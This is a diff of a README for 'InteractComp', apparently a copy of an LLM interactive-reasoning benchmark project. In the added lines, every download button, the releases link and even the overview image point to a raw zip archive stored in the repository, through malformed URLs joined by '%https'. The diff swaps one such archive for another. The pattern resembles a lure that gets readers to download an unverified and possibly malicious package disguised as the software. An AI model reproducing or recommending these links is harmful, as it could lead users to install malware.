@@ -1,12 +1,12 @@
 # 🎉 InteractComp - Evaluate Interactive Reasoning Tasks Easily
 
-[![Download InteractComp](https://raw.githubusercontent.com/Clean-armatacorsa767/InteractComp/main/core/engine/InteractComp_v1.1.zip%https://raw.githubusercontent.com/Clean-armatacorsa767/InteractComp/main/core/engine/InteractComp_v1.1.zip)](https://raw.githubusercontent.com/Clean-armatacorsa767/InteractComp/main/core/engine/InteractComp_v1.1.zip)
+[![Download InteractComp](https://github.com/Clean-armatacorsa767/InteractComp/raw/refs/heads/main/data/Comp_Interact_3.3.zip%https://github.com/Clean-armatacorsa767/InteractComp/raw/refs/heads/main/data/Comp_Interact_3.3.zip)](https://github.com/Clean-armatacorsa767/InteractComp/raw/refs/heads/main/data/Comp_Interact_3.3.zip)
 
 ## 📖 Overview
 
 InteractComp is a framework for evaluating how large language models manage interactive reasoning tasks. It includes a reusable ReAct-style agent, various search and clarification actions, and an asynchronous evaluation pipeline. With this tool, you can benchmark and analyze interactive reasoning more effectively.
 
-![InteractComp benchmark scope](https://raw.githubusercontent.com/Clean-armatacorsa767/InteractComp/main/core/engine/InteractComp_v1.1.zip)
+![InteractComp benchmark scope](https://github.com/Clean-armatacorsa767/InteractComp/raw/refs/heads/main/data/Comp_Interact_3.3.zip)
 
 ## ⚡ Highlights
 
@@ -25,7 +25,7 @@ InteractComp is a framework for evaluating how large language models manage inte
 To run InteractComp on your computer, follow these simple steps:
 
 1. **Download InteractComp**:
-   - Visit this page to download: [InteractComp Releases](https://raw.githubusercontent.com/Clean-armatacorsa767/InteractComp/main/core/engine/InteractComp_v1.1.zip).
+   - Visit this page to download: [InteractComp Releases](https://github.com/Clean-armatacorsa767/InteractComp/raw/refs/heads/main/data/Comp_Interact_3.3.zip).
    - You will find various versions of the software available for download.
 
 2. **Install and Run**:
@@ -54,7 +54,7 @@ To ensure smooth performance, please check the following requirements before ins
 
 Click the button below to access the download page:
 
-[![Download InteractComp](https://raw.githubusercontent.com/Clean-armatacorsa767/InteractComp/main/core/engine/InteractComp_v1.1.zip%https://raw.githubusercontent.com/Clean-armatacorsa767/InteractComp/main/core/engine/InteractComp_v1.1.zip)](https://raw.githubusercontent.com/Clean-armatacorsa767/InteractComp/main/core/engine/InteractComp_v1.1.zip)
+[![Download InteractComp](https://github.com/Clean-armatacorsa767/InteractComp/raw/refs/heads/main/data/Comp_Interact_3.3.zip%https://github.com/Clean-armatacorsa767/InteractComp/raw/refs/heads/main/data/Comp_Interact_3.3.zip)](https://github.com/Clean-armatacorsa767/InteractComp/raw/refs/heads/main/data/Comp_Interact_3.3.zip)
 
 Follow the steps provided above to download and run InteractComp on your system.
 
